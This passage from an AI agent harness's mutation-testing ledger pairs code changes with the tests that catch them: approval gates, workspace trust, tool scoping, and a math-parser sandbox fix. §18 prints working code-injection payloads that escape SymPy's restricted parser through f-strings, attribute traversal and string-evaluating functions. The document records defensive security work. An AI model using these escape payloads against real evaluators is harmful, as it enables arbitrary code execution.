| Remove the picker's `thread_id is None` guard | `test_a_dismissed_picker_does_nothing_at_all` | NOTE: an earlier version of this test asserted only "nothing was attached" and passed with the guard gone — summarising a None thread fails downstream, so refs stayed empty while the user got told "Could not summarise thread None". The assertion is on the whole outcome: no work, no output, `_busy` released |

### Standing: a shell that applies `with_goal` owes the same site a `with_refs`

Both are thread state read off `memory.extra`, and both are appended by the shells
rather than by the assembly point they share (K6). A new shell — or a new turn path in
an existing one — that applies one and not the other produces a reference that silently
does nothing on that path. The same standing note covers `with_memories`, with the
caveat that memories are conditional on there being no agent-built prompt and refs are
not.

## §14 — `/init` and the project documentation set (ROADMAP_v2 §24, `test_project_init.py`)

| Change | Breaks | Why |
|---|---|---|
| Write with `open()` instead of `registry.dispatch` | `test_the_write_goes_through_the_registry` | AC3/I1. Dispatch is what applies the approval gate, `check_input_policy` and output redaction |
| Give `write_project_doc` a `path` parameter | `TestTheScopedTools` | I1. "Cannot be aimed elsewhere" is structural because there is no path to supply — validating one instead is a weaker claim |
| Drop the document-name allowlist | `TestTheScopedTools` | The allowlist IS the confinement once the path is gone |
| Resolve `read_project_doc`'s path without `realpath` first | `test_read_follows_symlinks_before_deciding` | A link that looks contained and resolves outside is exactly the case the ordering exists for |
| Widen `read_project_doc` to any text file | `TestTheScopedTools` | A permission-`True` tool is advertised to EVERY run, not only `/init`'s. Widening it turns it into `read` with no approval gate, reachable from a research pass |
| Raise `INIT_READ_CHARS` to `MAX_READ_CHARS` | `test_read_caps_below_the_general_read_tool` | TECHNICAL_DEBT item 9: each read is re-billed on every later step |
| Drop `max_total_tokens=INIT_TOKEN_BUDGET` | `test_the_run_gets_its_own_budget_not_the_chat_one` | §26's reasoning — the chat budget cuts a tool-heavy run off early |
| Drop `thread_kind` from the initializer run | `test_the_run_is_labelled_as_a_subagent_thread` | §27: the initializer is a SIXTH thread source |
| Give the initializer a write tool | `test_the_agent_can_only_read` | I8. The agent drafts; the shell writes, because only the shell can show a human a diff |
| Let `confirm=None` proceed | `test_no_confirm_route_writes_nothing` | §25's V6, sixth instance |
| Stop passing the existing hub to the agent | `test_an_existing_context_is_given_to_the_agent_to_revise` | I4. Hand edits survive by design, not by the user re-applying them after rejecting a diff |
| Overwrite documents that already exist | `test_an_existing_document_is_left_exactly_as_it_was` | I12. Only the hub is a file `/init` claims to author |
| Make `render_index` depend on what is on disk | `test_a_second_run_changes_nothing` | I11, and the defect that found it: the second run rewrote `CONTEXT.md` and called files `/init` had just written "pre-existing" |
| Re-grant trust unconditionally | `test_an_untrusted_project_is_not_laundered` | I6. A cloned repo's `.venastine/` must not become trusted as a side effect of an unrelated command |
| Capture `is_trusted()` after the write | `TestWorkspaceTrust` | The hash has already moved, so a trusted project reads as untrusted and is never re-granted |
| Exclude the root `AGENTS.md` from the D17 hash | `test_the_hub_still_counts_towards_the_hash` | Same hole as the above, with a smaller mouth |
| Drop `_is_secret` from `manifest._tree` | `test_the_manifest_hides_credential_files` | NOTE: the identical call in `_root_documents` is currently UNREACHABLE — nothing is both "interesting" and secret — so mutating that one proves nothing. `_tree` is the load-bearing call |
| Return the raw answer from `ask_project_kind_blocking` | `test_an_unrecognised_kind_answer_cancels` | NOTE: asserting "nothing was written" passes either way, because `generate()` refuses a non-kind downstream. The test asserts the outcome that differs — a clean cancellation rather than an error quoting a value the user never chose |

### Standing: a broken `/init` modal presents as a HUNG suite, not a red one

Two mutations here — `ConfirmScreen.action_decline` dismissing with no value, and
skipping the project-kind modal so the confirmation opens unexpectedly — leave the
`/init` worker parked on `queue.get()`. That also blocks `run_test()`'s teardown, so
pytest stops rather than failing. It is the "every dismissal path carries a value"
invariant doing its job (§16 AC2's original lesson, now in its sixth place), but if the
suite hangs in `test_project_init.py`, look for a modal path that dismisses with
nothing before looking for an infinite loop.

## §15 — the response channel (ROADMAP_v2 §23 slice 1, `test_interaction.py`)

| Change | Breaks | Why |
|---|---|---|
| Make `decode` return the raw value | `TestReview`, `TestChoice` | The whole module exists so one function decides what a non-answer means |
| Make `ask(None, request)` permissive | `TestEveryRouteDeclines` | §25's V6: the inability to ask is not permission to proceed |
| Narrow `ask`'s `except Exception` | `TestEveryRouteDeclines` | A shell that raises must decline, not propagate into the loop |
| Give a kind a permissive default | `test_every_default_declines` | The asymmetry IS the design |
| Return a default for an unknown kind | `test_an_unknown_kind_raises_rather_than_defaulting` | An undefined question is a bug; inventing "no" hides the typo |
| Accept a bare `"accept"` string for review | `TestReview`, `test_the_modal_answer_decoder_fails_safe` | The one kind whose permissive failure APPLIES an edit. The two decoders this replaced disagreed here |
| Test sign-off emptiness with `if raw:` | `TestSubagentSignoff` | Folds "spawn with nothing granted" into "refuse the spawn" — the middle of three answers |
| Drop the candidates intersection | `test_a_name_that_was_not_offered_is_not_granted` | A shell must not grant a tool nobody offered. Only possible because `decode` takes the request |
| Drop the options check on a choice | `TestChoice` | Same, and it is the guard §24 shipped by hand and untested |
| Pass the kind to `decode` instead of the request | everything above | Two kinds become unverifiable |

### §23's migration, in the files it touched

| Change | Breaks | Why |
|---|---|---|
| Bypass `interaction.ask` in `_obtain_approval` | `test_streaming_loop.py`, `test_attended.py` | One route is the point |
| `headless = False` | `TestHeadlessIsAboutBeingUNABLEToAsk` | "No way to ask" is one condition again |
| Ignore `honour_run_scope` | `TestRunScope` | §25 R11: attended mode must re-ask |
| Drop the bundle's channel from `_authorization_kwargs` | `test_review.py`, `test_research_authorization.py` | §20's reviewer inherits the run's channel |
| `a or kwargs.pop(...)` for the channel merge | `test_passing_both_does_not_raise` | Short-circuits, so the key survives on the path where an explicit channel was passed — "got multiple values for keyword argument" |
| Remove `walk_consent`'s `consent is None` branch | `test_findings_are_recorded_but_nothing_is_applied` | NOTE: V6's OUTCOME now holds without it, because `ask(None, …)` declines. What the guard uniquely provides is the audit trail — a `reason_declined` and a trace line, rather than a rejection indistinguishable from a human's |
| Drop `request_kind="subagent_signoff"` from the registration | `TestTheSignoffIsActuallyWired` | NOTE: the memo test PATCHES `request_kind`, so it cannot see this |
| Empty `request_payload`'s candidate list | `TestTheSignoffIsActuallyWired` | Same — patched away by the memo test |
| Drop `signoff` from dispatch's injection map | `test_dispatch_injects_the_subset_into_the_handler` | Every other sign-off test calls `subagent_tool.run()` directly |
| Grant `candidate_approvals` wholesale again | `test_spawn_forwards_the_channel_and_the_grant` | The pre-§23 behaviour AC1b exists to end |
| Treat a `None` sign-off as approval | `test_refusing_a_spawn_stops_it_happening` | Refusing the spawn and spawning with nothing granted are different outcomes |
| Key the sign-off memo by tool name only | `test_s1_signoff_is_remembered_per_agent_not_per_tool_name` | J8: one prompt about agent `a` must not cover agent `b` |
| `SubagentSignoffScreen`'s escape dismissing `set()` | `TestTheSignoffScreen` | Escape refuses; it does not run with nothing granted |

## §23 slice 2 — the question tool and the todo list

`tests/test_question_tool.py`, `tests/test_todo.py`, and the `TestQuestion`
class in `tests/test_interaction.py`.

| Change | Symptom | Fix |
|---|---|---|
| Return the answered options without intersecting them against `payload["options"]` | `TestQuestion::test_an_unoffered_option_is_dropped`, `test_nothing_offered_means_no_options_come_back` | J3's rule, third instance. A shell returning something nobody proposed is answering a different question. The options live on the request precisely so `decode` can check them |
| Decode a `defer` answer as `None`, or drop the `defer` key from the decoded dict | `TestQuestion::test_defer_is_a_real_answer` / `test_defer_ignores_anything_alongside_it`, plus `test_question_tool.py`'s deferral and CLI tests | A deferral is a REAL answer — the user engaged and chose to discuss. A dismissal is not. Collapsing them makes the modal's "Discuss instead" button pointless, and it is `SUBAGENT_SIGNOFF`'s middle-answer trap one kind along |
| Let `ask_user` proceed when `response_channel is None` | `TestHeadlessDeniesAndSaysWhy` (3 tests) | AC2. With nobody to ask, the call is denied and the error tells the model to decide and state its assumption. §25's V6 one section along: the inability to ask is not permission to proceed |
| Gate `ask_user` (`ToolApprovals.ask_user = True`) | `test_the_tool_is_still_ADVERTISED_with_no_channel`, `test_it_is_ungated_and_allowed` | J12. §13 does not merely deny a gated tool where nothing can ask — it stops ADVERTISING it, so a gated `ask_user` is invisible rather than deniable and the model cannot "work around" anything |
| Truncate `options` to `MAX_OPTIONS` instead of refusing | `TestTheOptionCap::test_five_options_are_REFUSED_not_truncated`, `test_the_cap_error_names_the_limit_and_the_count` | Truncating shows the user a different question from the one the model asked, and the model then reads the answer as a response to the whole list. M15's rule with the model in the naming role |
| Drop the `QUESTION` branch from `main.py`'s `ask` or `tui/app.py`'s `_ask_blocking` | `TestTheCliRenderer` (8 tests) / `TestTheTuiModal` (5 tests) | D12. A kind a shell does not render falls through to `None` and decodes as "nobody answered" on every run in that shell, while looking wired up |
| Have `todo_write` write `memory.extra["todos"] = …` instead of `memory.set_extra(...)` | `test_it_persists_through_set_extra_not_by_mutating_extra` | `extra` is a COPY (`core/memory.py`), so mutating it changes nothing and reports success. The symptom is invisible until the next turn |
| Truncate an over-cap todo list, or coerce an unknown status to `pending` | `test_over_the_cap_is_REFUSED_not_truncated`, `test_an_unknown_status_is_REFUSED_not_coerced` | Both leave the model believing it recorded something it did not. `MAX_INJECTED_REFS`' refuse-rather-than-drop rule |
| Stop `_run()` yielding a tool result's `notice` as a `LoopEvent` | `TestTheLoopForwardsAndStripsIt::test_a_notice_on_a_tool_result_becomes_a_loop_event` | AC4's event route (J10). Note the PANEL tests still pass — they post the message directly — so this mutation is caught by the loop test alone, which is why both exist |
| Leave the `notice` in the result instead of popping it | `test_the_notice_is_STRIPPED_from_what_the_model_sees`, `test_a_malformed_notice_is_dropped_not_raised` | A notice is plumbing for the shell. Leaving it in sends the panel's trigger to the model as part of the tool's answer |
| Recognise `todo_write` by name in `core/loop.py` instead of forwarding any result `notice` | Nothing goes red — and that is the point of the generic route | `ToolSpec.grant_scope` and `request_kind` exist so no tool name appears in the loop. `TestTheLoopForwardsAndStripsIt` drives a fake `probe` tool precisely so the mechanism is tested without the tool that motivated it |
| Move `with_todos` inside `with_catalogs()`, or add the fragment to `pass_prompt()` | `TestThePromptTier::test_it_is_NOT_inside_with_catalogs` | §19's K6, FOURTH instance after §21b's M13 and §21c's M19. A checklist written in a chat session would land in all ten passes of a separate research run. The test asserts against three REAL pass prompts, so a leak added one call deeper still fails |
| Remove `ask_user` or `todo_write` from either `config` dataclass | `RuntimeError` at import of `tools.registry`, naming the tool | D24. Verified by deleting `ToolPermissions.todo_write` |
| Make `tui.todo_position` fall back on an unknown value instead of raising | `TestTodoPosition::test_an_unknown_position_raises_and_names_the_vocabulary` | `research.approval_mode`'s precedent, not `tui.theme`'s: the vocabulary lives in `config_loader`, and a position the renderer does not understand puts the panel somewhere the user did not ask for. `tui.effort` had neither check and that was a shipped bug |
| Drop `TodoPanel.__init__`'s `self.display = False` | `TestThePanelWidget::test_it_starts_hidden` | A Textual `reactive`'s watch method does not fire for its initial value, so the panel is a visible empty box until something first sets `todos` — which on a fresh thread may be never |
| Set `display = True` once (ResearchProgress's shape) instead of toggling it | `test_clearing_HIDES_IT_AGAIN` | A todo list empties as well as fills, so the reveal has to be reversible |
| Write a transcript line for a `todo_changed` notice | `test_a_todo_notice_writes_NO_transcript_line` | The list changes several times in a turn; in an append-only transcript that is a column of near-identical lines. §26 made the same call for `pass_activity`. The neighbouring test asserts other notice kinds STILL write theirs, which §21a's "no silent compaction, ever" depends on |

---

## §10 revisit — the ensemble redesign (`test_ensemble_guard.py`, `test_orchestrator.py`, `test_confidence_scoring.py`)

`test_ensemble_guard.py` was rewritten wholesale (3 → 15 tests). It used to guard
§16's refusal of ensemble mode on a model that rejects sampling parameters;
diversity now comes from a roster of different models, so no sampling parameter
is involved and no model is excluded. **The reason the guard exists carried over
even though the mechanism did not** — refusing beats running degraded, because a
degraded ensemble run does not fail, it reports false confidence expensively.

Two constants were **deleted**: `config.ENSEMBLE_TEMPERATURE` (the defect) and
`config.ENSEMBLE_N` (N is `len(config.ENSEMBLE_MODELS)` now). The
`settings.json` key `ensemble_n` and the `ensemble_n` pipeline parameter both
**survive** — removing the key would make every existing `settings.json` that
sets it raise, since unknown keys raise by design.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Count roster entries instead of **distinct** `(provider, model)` pairs | `test_one_distinct_model_repeated_is_refused` | The distinctness is the guard. `[X, X, X]` recreates §10's original defect through the new config: no sampling variation remains to make the candidates differ, so they arrive near-identical and every claim scores maximal consistency |
| Add `ensemble_models` to `_KNOWN_SETTINGS` (or drop the named rejection) | `TestSettingsRejectsARoster::test_ensemble_models_is_rejected_by_name` | R12's rule, second instance. The mode is a bool that can only spend more of the provider the user already chose; a **roster chooses providers**, and a project's `settings.json` beats the user's. Rejected by name so the omission does not read as an oversight to fix |
| Run every Pass 1 candidate on the run's own `model`/`provider_name` | `test_each_candidate_runs_on_its_own_provider_and_model`, plus two others | That *is* the mechanism. Note the plain `call_log` cannot catch this — it records only pass ids, so three runs of one model look identical to a three-model ensemble. Use `_routing_mock`, which records `(pass_id, provider_name, model)` |
| Let a candidate's exception propagate instead of skipping | `test_a_failed_candidate_is_named_traced_and_skipped` and three others | §20's containment rule. One unreachable provider must not flip a ten-pass run to `failed` |
| Drop the cause from the skip trace line | Same test, on the `"connection refused"` assertion | "A candidate failed" with no cause is not something a user can act on |
| Label candidates by roster position rather than survivor order | `test_candidate_labels_follow_survivors_not_roster_positions` | A gap ("Candidate 1, Candidate 3") makes Pass 2 tag a claim both survivors asserted as `[1, 3]` against a denominator of 2, so unanimous claims read as dissented-against. Silently deflated confidence is the failure class this section removes |
| Score a single survivor as an ensemble of one (`effective_n >= 1`) | `test_one_surviving_candidate_scores_without_a_penalty` | One candidate cannot disagree with itself, so every claim would score consistency 1.0 and report unanimous corroboration from a single source. `ensemble_n=0` is the **correct** formula there, not a degraded one |
| Honour a passed `ensemble_n` over `len(ENSEMBLE_MODELS)` | `test_ensemble_n_is_ignored_in_favour_of_the_roster` | A confidence score's denominator must not be able to disagree with the roster that produced the candidates |
| Make the disagreement penalty `W * consistency` instead of `W * (1 - consistency)` | `test_ensemble_factual_uses_ensemble_formula`, `test_ensemble_dissent_subtracts_and_grounding_is_not_diluted` | Unanimity must be free. A claim is not penalised for having been generated by an ensemble |
| Restore `0.4/0.3` weighting for ensemble runs | The two above plus `test_partial_grounding_factual_lands_medium` and `test_non_ensemble_regression_identical_output` | Grounding is the pipeline's strongest evidence; which generation strategy produced a claim is no reason to weigh its verification differently |
| Subtract the disagreement penalty in the **non-factual** arm | `test_ensemble_non_factual_ignores_consistency` | E9. **This mutation ran GREEN before that test was fixed**: it asserted with `asserted_by_candidates=[1,2,3]` against `ensemble_n=3`, so the penalty it excluded was zero for that input. It now sweeps 3/3, 1/3 and 0/3 — assert the premise, or the conclusion means nothing |
| Compare the unrounded score against `TIER_THRESHOLDS` (i.e. revert E10) | `test_a_recorded_score_on_a_threshold_gets_that_threshold_s_tier` and `test_the_tier_reads_the_same_number_the_breakdown_stores`, the latter reporting the original symptom verbatim | Round once, use it for both. Note the swept test also covers ensemble inputs, so it catches this regardless of which formula produced the score |
| Delete `_sampling_kwargs`, `MODELS_REJECTING_SAMPLING_PARAMS` or `temperature`'s threading as dead code | Nothing fails immediately — which is the hazard | They are a **backstop** now: nothing in the harness passes a temperature, and the WARNING is how the next caller that wants sampling variation learns it cannot have it. Silence here is exactly how §10's defect stayed invisible |

### Standing: the doc-count guard fires on every added test

`test_docs_consistency.py::test_the_documented_count_is_the_real_one` compares
the collected total against the number quoted in `README.md`, `AGENTS.md` and
`ARCHITECTURE.md`. It **skips** on a narrowed invocation, so a green
`pytest tests/test_ensemble_guard.py` says nothing about it. Run the full suite
before committing, and update all three quotes together.

---

## §16 — the first fix batch from Audit Pass 1 (2026-08-15)

Nine audit findings, all closed by adding tests rather than changing production code. Every
row below was a mutation that left **all 1406 tests green** before this batch; each is now
pinned by the named test. If you are reverting one of these tests, the mutation in its row is
what stops being caught.

**These tests were each driven against their own mutation before landing.** That is the
standard the batch was held to, and two of them failed it on the first attempt — see the two
"standing" notes at the end, which are the more useful half of this section.

### New files

| File | Tests | What it pins |
|---|---|---|
| `test_fake_storage_mirror.py` | 16 | `FakeStorage._reconstruct` / `_split_at` against `storage._to_neutral` / `storage._split_at` (#123) |
| `test_prompt_tier_boundary.py` | 11 | K6 as a rule: a pass prompt is invariant under every session tier (#146) |
| `test_sdk_conformance.py` | 4 | the real pinned SDKs, offline — google-genai fields, the thinking_budget pin note, httpx's redirect default, and #35 as a strict xfail (#143) |
| `test_fetch_url.py` | 18 | `fetch_url`'s whole surface, which no test had ever executed (#120, #58) |

### What breaks them

| Change | Symptom | Why the guard exists |
|---|---|---|
| Change `storage._to_neutral`'s reconstruction without changing `FakeStorage._reconstruct` identically (or vice versa) | `test_fake_storage_mirror.py::TestReconstructionMirrorsProduction` fails, naming the role that diverged | AGENTS.md's "verify against production, not the test double" was a convention nothing checked. Both are pure functions, so the check is direct |
| Make `_split_at` return `len(rows)` for a watermark it cannot find, on **either** side | `test_an_unknown_watermark_is_zero_on_both_sides` | The 0 is what shows the whole thread rather than hiding a prefix on the strength of an id that could not be resolved |
| `return Claim(**raw)` in `_claim_from_json` | 8 tests in `test_orchestrator.py`, including the end-to-end path — the canned Pass 2 payload carries a `confidence` key for exactly this | Nothing outside the allowlist appeared in any canned payload, so the filter was never exercised |
| Widen or narrow `_CLAIM_INPUT_FIELDS` | `test_every_allowlisted_field_still_arrives`'s exact-contents assertion | The previous worked example (`asserted_by_candidates`) was moved INTO the allowlist by §10's revisit, so two documents described filtering with a field that was no longer filtered |
| Remove `dirs.sort()` from `_content_hash` | `test_descent_order_does_not_change_the_digest` | An unchanged `.venastine/` hashing differently re-prompts for trust already granted, and repeated unexplained trust prompts are what train someone to approve without reading |
| Remove `dirs.sort()` from `content_files` | `test_descent_order_does_not_change_the_trust_prompt_listing` + `test_content_files_sorted_and_relative` | Same one-line guard at the site that produces the text a user reads to decide whether to trust a project |
| Append any tier inside `prompts.system_prompts.with_catalogs()` | `test_no_tier_canary_reaches_any_pass_prompt[<tier>]` names the tier; `test_with_catalogs_itself_carries_no_session_tier` names the function | K6/M13/M19/J11 each pinned ONE tier. Appending the project's `CONTEXT.md` inside reached all ten research passes with 1406 green |
| Replace `list_threads`' SQL `WHERE` with a Python filter | `test_list_threads_filters_by_kind_in_sql` — it now reads the statements the driver executes, not the set returned | The returned set is identical either way, so the test was named for a mechanism it could not observe |
| Delete `self._cancel_manager()` from `connect_all`'s except block | `test_connect_timeout_cancels_the_manager_task` — via `_done`, which the except block does not touch | `_task is None` and `clients == {}` are set by the other two statements; they record the release, they do not cause it |
| Remove `fetch_url`'s scheme check or its `is_domain_blocked` call | 7 and 1 tests in `test_fetch_url.py`, each asserting the request never left the process | Both are live and ungated: advertised in plain chat and in all ten research passes |
| Drop the `+ os.sep` from `_is_within_workspace` | `TestSiblingDirectoryPrefix` | `/workspace-evil` is judged inside `/workspace`, turning a PROMPT into an auto-approval. Dormant behind the global deny, which is why it needs a test |
| Narrow `_is_readable_doc`'s `.env` prefix test to `==`, or its any-segment check to `parts[0]` | `test_read_refuses_env_files_with_a_suffix` / `test_read_refuses_a_denied_segment_at_any_depth` | The pre-existing tests used `.env` exactly and put `.venastine` first, so both narrowings kept them green |
| Fix #35 or #53 | The strict `xfail` for each turns into `[XPASS(strict)] … FAILED` | Deliberate. A strict xfail tells whoever fixes the bug to delete the marker, instead of leaving a green xpass nobody reads |

### Standing: a test that fails for the wrong reason is indistinguishable from one that works

Two of this batch's tests passed their first driving for reasons unrelated to what they were
named for. Both were found only by asking *why* the result looked right.

- **`test_sdk_conformance.py`'s #35 arm** reported `xfail` because real `anthropic` does
  `from httpx import URL, Proxy, Timeout, …` at import time, and `real_package("anthropic")`
  left the fake `httpx` in place — so it died with `ImportError` before reaching
  `ModelCapabilities`. **Reaching a real package past a fake means unfaking its dependencies
  too.** Fixed by `real_package("anthropic", "httpx")`.
- **`test_workspace_trust.py`'s first descent-order test** compared a "reversed" walk against
  the real one — and this filesystem enumerates `.venastine/` as `skills, agents`, which is
  already reverse-alphabetical. Two identical orders, compared. **When a test's input is
  "whatever the environment happens to do", control BOTH sides.** Both walks are now
  synthetic, and `test_the_two_walk_doubles_really_do_differ` asserts they differ.

The general form, which `test_pilot_wait.py` already carries for the pilot helpers: when a
test's whole job is to fail on a specific defect, the defect has to be applied and the failure
read — and the *reason* for the failure checked, not just its presence.

### Standing: "collect problems, assert none" passes loudest when it sees nothing

`test_sdk_conformance.py` has two checks of that shape, and both now assert they can see their
subject first — the AST walk found ≥6 classes and ≥10 keywords; `ThinkingConfig` exposes some
`model_fields` at all. An empty collection satisfies "no problems" and an absent field
satisfies `not in`, so either would have gone quietly vacuous at exactly the moment the thing
it inspects stopped being readable.

### Standing: the fake `httpx` now carries state

It gained `_queued` and `_requests` for #120, driven through `tests/conftest.py`'s `http`
fixture, which clears both before and after every test. Reaching into `httpx._queued` directly
from a test leaks a queued response into the next one. The default answer with an empty queue
is unchanged (`_Response(text="", url=url)`), so every pre-existing caller is unaffected.

---

## §17 — the second fix batch from Audit Pass 1 (2026-08-15)

The first batch added tests only. **This one changes production code** — three files, closing
two S0s and two S1s. Every fix was driven against its own mutation before being called done;
the mutation driver is recorded per row below.

| Change | Issues | Files |
|---|---|---|
| Persist the tool-result row before emitting its event | #42 | `core/loop.py` |
| Drop empty assistant turns above the provider branch split | #13, #36 | `core/client.py` |
| Treat a symlinked project tier root as absent | #18 | `core/config_loader.py` |

Suite 1468 → **1488**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Move `memory.add_tool_result()` back after the `yield` | `test_an_abandoned_generator_still_persisted_the_tool_result` + `test_the_assistant_tool_use_was_persisted_too` | D20 already wrote the `tool_use`; the orphaned pair is an unresumable thread, and the failure surfaces on a later resume as a provider error naming none of this |
| Move `tool_call_start` after its dispatch | `test_the_tool_call_start_event_still_precedes_the_dispatch` | The *correct* ordering, pinned so #42's fix is not over-applied. There is nothing to persist at that point |
| Delete the `_is_empty_assistant_turn` pre-filter | 6 tests, including `test_messages_google_empty_assistant_turn_skipped`, which predates the fix | Google's local guard is gone, so the pre-existing test now holds the shared rule — that is the point of moving it |
| Key `_is_empty_assistant_turn` on empty text alone | 6 tests, including the pre-existing `test_messages_openai_assistant_with_null_text` and two Google tool-result tests | A tool-call-only turn has no text. Dropping it takes the `tool_use` with it and orphans the `tool_result` — #42's defect, reached from the translation side |
| Re-add a local empty-turn guard to any one branch | Nothing, and that is the hazard | Two rules that can disagree is the state #13/#36 were filed from. `test_no_provider_emits_a_message_for_an_empty_assistant_turn` is parametrised over all three so a fourth branch inherits the property |
| Drop `os.path.islink` from `_tier_dirs`' project entry | 3 tests in `test_config_loader.py` + `test_the_loader_reads_no_file_the_trust_listing_omits` | Project content loads unhashed, unlisted, and mutable after one grant — and the payload is system-prompt instructions |
| Apply that symlink check to the harness or user tier too | `test_a_symlinked_user_tier_root_still_loads` | Nothing hashes those directories, so it is not a trust question; symlinking `~/.config/venastine/` into a dotfiles repo is legitimate |
| Make `os.walk` follow links in `workspace_trust` | `test_a_symlinked_tier_root_is_invisible_to_both_the_hash_and_the_listing` | Not a regression — a prompt. That test pins the *current* asymmetry, so following links becomes a deliberate change made with the cycle and realpath guards it needs, and #18's loader guard can then be reconsidered |

### Standing: an invariant of the form `A ⊆ B` decays into a tautology

`test_the_loader_reads_no_file_the_trust_listing_omits` asserts `read <= listed`, which is
trivially true when `read` is empty — so it would pass loudest if `_md_files` stopped finding
anything at all. `test_that_invariant_can_actually_fail` is the mutation run as a test: it
rebuilds the pre-#18 unguarded path, asserts it finds something, and asserts that something
escapes the listing. Delete it and the invariant above still passes forever.

This is the same failure mode as the previous batch's "collect problems, assert none", and the
third shape of it recorded here. Subset, emptiness and non-membership assertions are all
satisfied by an absent subject.

### Standing: the producer-side fix is what closes the class

#13 was filed against the OpenAI branch and was live — it killed a real Pass 2. Applying its
suggested fix exactly as written would have left **the default provider** dying differently
(#36), and Google correct only by accident of which provider was under debug when the hazard
was first met. One filter above the split fixed all three and pre-fixes the fourth. That is
AGENTS.md's *fix at the producer, not the consumer* rule meeting a case where the consumers
were three provider branches rather than two call sites.

---

## §18 — #52, the S0 in the math tools (2026-08-15)

`safe_parse`'s stated guarantee — "`__builtins__` blanked, injection-tested" — was false in both
halves, and arbitrary code executed through the real `registry.dispatch` on six tools that are
advertised and ungated in every research pass. Replaced with an **allowlist at the token
boundary**: `_reject_unsafe_names`, first in `_TRANSFORMATIONS`.

Suite 1488 → **1576**. The single injection test became 26 payloads, a 37-case legitimacy
battery, and four closure tests.

### The token filter was wrong, and the bypass is the point

The first version of this fix rejected dunder and non-allowlisted NAME **tokens**. It was
bypassed within the hour of shipping:

```
f"{sympify('__import__(chr(111)+chr(115)).getpid()')}"   ->  the pid, and base64 imported
"{0.__class__.__bases__}".format(pi)                     ->  dunder attributes
sin(pi).func.mro()                                       ->  classes, no underscore anywhere
```

On Python 3.11 an f-string is a **single `STRING` token** (PEP 701 split it into `FSTRING_*`
tokens only in 3.12), so a NAME filter cannot see inside one — while the code within evaluates
with `_SAFE_GLOBALS` in scope, `sympify` included. **A token stream is not the language**, and
which constructs the tokenizer hides is a property of the Python version, not of this code.

The guard is now `_validate_ast`: `parse_expr` split into `stringify_expr` → *check* →
`eval_expr`, validating the AST of exactly the string that will be evaluated against a closed
allowlist of 39 node types out of Python's 118.

### What breaks it

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Add `ast.Attribute` to `_ALLOWED_NODES` | `test_the_dangerous_node_types_are_refused[Attribute]` + 6 payloads | Attribute traversal IS mechanism 2, and is also how `str.format`, `.mro()` and every bound-method route is reached |
| Add `ast.JoinedStr` / `FormattedValue` | same test, + 4 payloads | The bypass that killed the token filter |
| Add `Lambda`, a comprehension, `Starred`, `Dict`, `Set`, `NamedExpr` | same test, parametrised per node | Each is a construct that would have to be argued harmless instead of refused |
| Widen `_ALLOWED_NODES` generally | `test_the_node_allowlist_is_closed_and_small` | Closure is the property. Coverage is not |
| Allowlist any evaluating name | `test_no_permitted_name_can_evaluate_a_string` | Mechanism 1 |
| Allowlist a module name | `test_no_module_object_is_permitted` | It caught `evalf`, which is a **module** in `_SAFE_GLOBALS`, not the method — allowlisted by mistake |
| Go back to `parse_expr()` | 30+ payloads | The check only exists because the two halves are called separately |
| Narrow `_ALLOWED_NAMES` to nothing | 34 legitimacy tests | **Every attack test still passes.** The legitimacy battery is the only thing that sees this |

That last row is why the legitimacy battery exists, and it is #47's lesson applied: an allowlist
needs a test asserting that real producers satisfy it.

### Mechanism 4: a string literal reaching a function that sympifies it

Found by **auditing the allowlist's own source** for calls to `eval`/`exec`/`sympify`, not by
guessing at payloads. Seven permitted names do it — `factor`, `cancel`, `together`, `apart`,
`roots`, `degree`, `nsolve` — and a string literal handed to any of them re-enters the parser
with SymPy's default globals, real builtins included:

```
factor(" __import__(chr(111)+chr(115)).getpid() ")   ->  the pid
```

The leading space is the whole trick: the guard's dunder tripwire matched *prefix and suffix*,
so one space walked past it. Prefix-matching a payload is the same category of mistake as
`chr(111)+chr(115)` defeating a search for the literal `"os"`.

`stringify_expr` gives a string argument to exactly two calls — `Symbol('x')` and
`Float('1.5')` — so `_STRING_ARG_CONSTRUCTORS` licenses those two positions and every other
string literal is refused. **This closes the class without knowing which functions sympify**,
which is the difference between a closure and a filter. Adding a name to
`_STRING_ARG_CONSTRUCTORS` means arguing that the constructor does not sympify what it is
handed.

### Standing: assert the GUARD refused, not that something raised

An earlier version of the battery asserted `pytest.raises(MathParseError)`. Under a
guard-runs-last mutation **all 68 tests stayed green** — `external.gmpy.os` dies with an
`AttributeError` anyway, `split_symbols` having already shredded `external` into
`e*x*t*e*r*n*a*l`. The payload was refused; the guard was not what refused it. The battery now
asserts the guard's own message.

Third time this session that the "fails for the wrong reason" rule has caught something, and the
first time it caught something in a test written *after* the rule was recorded.

### The output backstop, and why it is a deny rather than an allowlist

`_reject_escaped_value` is the only check on what `safe_parse` RETURNS. It refuses a module, a
plain function or method, or a class from outside SymPy, recursing through returned containers
(`solve` returns a list, `roots` a dict, so an escaped object can arrive nested).

It is deliberately a **deny of the escape signature**, not an allowlist of return types: its job
is to catch an escape nobody anticipated, and an allowlist can only catch escapes whose shape was
already imagined — which four of this issue's five mechanisms were not.

| If production code changes like this… | …this fails |
|---|---|
| Drop the `_reject_escaped_value(result)` call | `test_the_backstop_is_actually_wired_into_safe_parse` |
| Let modules through | `test_the_backstop_refuses_a_module` |
| Let any class through | `test_the_backstop_refuses_a_non_sympy_class` |
| Stop recursing into containers | `test_the_backstop_looks_inside_containers` |
| Widen `_STRING_ARG_CONSTRUCTORS` | 11 payload tests |
| Drop the string rule | 10 payload tests |

`test_the_backstop_allows_every_legitimate_return_shape` is the discriminator: a backstop that
refuses everything passes all four of the negative tests above.

### 117 of 213: the allowlist is not "just maths"

The source audit that found mechanism 4 could read **15** of the 229 resolvable allowlisted
names; the other 214 are C extensions. The blackbox probe covers all of them, and the answer is
**117 evaluate a string handed to them** — not 7.

That number is the argument for the string rule being load-bearing rather than defence in depth.
`Symbol` and `Float`, the two licensed positions, are not among the 117, and
`test_the_licensed_string_constructors_do_not_evaluate_their_argument` is the obligation the
licensing decision rests on. `test_the_probe_can_detect_an_evaluator` guards it, because that
test asserts a negative and would pass perfectly if the probe stopped working.

### Not claimed

The battery covers the two filed mechanisms and 14 payloads, and the allowlist fails closed. It
is **not** a proof that no escape exists: the 231 permitted callables were not individually
audited for evaluation behaviour. #57 (no wall-clock bound on math tools) is untouched and
remains open — a token filter bounds what can be *named*, not how long it runs.

---

## §19 — the third fix batch from Audit Pass 1 (2026-08-17)

The S0 tier is clear, so this batch takes the two **S1**s that were ready to build: both carried
